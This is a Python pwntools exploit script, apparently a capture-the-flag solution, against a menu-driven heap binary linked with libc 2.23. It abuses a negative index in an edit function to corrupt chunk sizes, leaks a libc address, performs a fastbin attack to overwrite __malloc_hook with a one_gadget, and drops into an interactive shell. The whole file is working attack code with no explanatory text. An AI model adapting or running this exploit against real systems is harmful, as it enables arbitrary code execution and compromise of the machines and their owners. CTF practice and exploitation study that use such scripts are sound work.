from pwn import *
import sys, os
context.log_level = 'debug'
prog = './pwn'
elf = ELF(prog)

p = process(prog)

libc = ELF("./libc-2.23.so")
#p = remote("8sdafgh.gamectf.com", 10001)
def dbg():
    gdb.attach(p)
    p.interactive()

def add(size, content):
	p.sendlineafter("5.Exit\n", '1')
	p.sendlineafter("3.Large\n", str(size))
	p.sendlineafter("Content:\n", content)
def show(idx):
	p.sendlineafter("5.Exit\n", '4')
	p.sendlineafter("view?\n", str(idx))
def edit(idx, wz, content):
	p.sendlineafter("5.Exit\n", '2')
	p.sendlineafter("Which one do you want to update?\n", str(idx))
	p.sendlineafter("Where you want to update?\n", str(wz))
	p.sendafter("Content:\n", content)
def free(idx):
	p.sendlineafter("5.Exit\n", '3')
	p.sendlineafter("delete?\n", str(idx))
def exp():
	add(1, 'a')#0
	add(2, 'a')#1
	add(2, 'a')#2
	add(1, 'a')#3
	add(1, 'a')#4
	edit(1, -2147483648, p64(0)*3+p64(0xb1)+'\n')
	free(1)
	add(2, 'a')#5
	show(2)
	libc_base = u64(p.recvuntil("\x7f")[-6:]+'\x00'*2)-0x3c4b78
	free_hook = libc_base + libc.sym['__free_hook']
	malloc_hook = libc_base + libc.sym['__malloc_hook']
	add(3, 'a')#6 == 2
	add(2, 'a')#7
	add(1, 'a')#8
	edit(7, -2147483648, p64(0)*3+p64(0x71)+'\n')
	free(7)
	edit(2, -2147483648, p64(0)*3+p64(0x51)+'\n')
	free(2)
	arena = libc_base + 0x3c4b4d
	edit(6, 0, p64(arena)+'\n')
	add(3, 'a')#8
	add(3, '\x00'*0x3+p64(0)*3+p64(malloc_hook-0x10))#9
	add(3, p64(libc_base + 0xf1147))
	add(3, 'a')	
	p.interactive()
if __name__ == '__main__':
	exp()
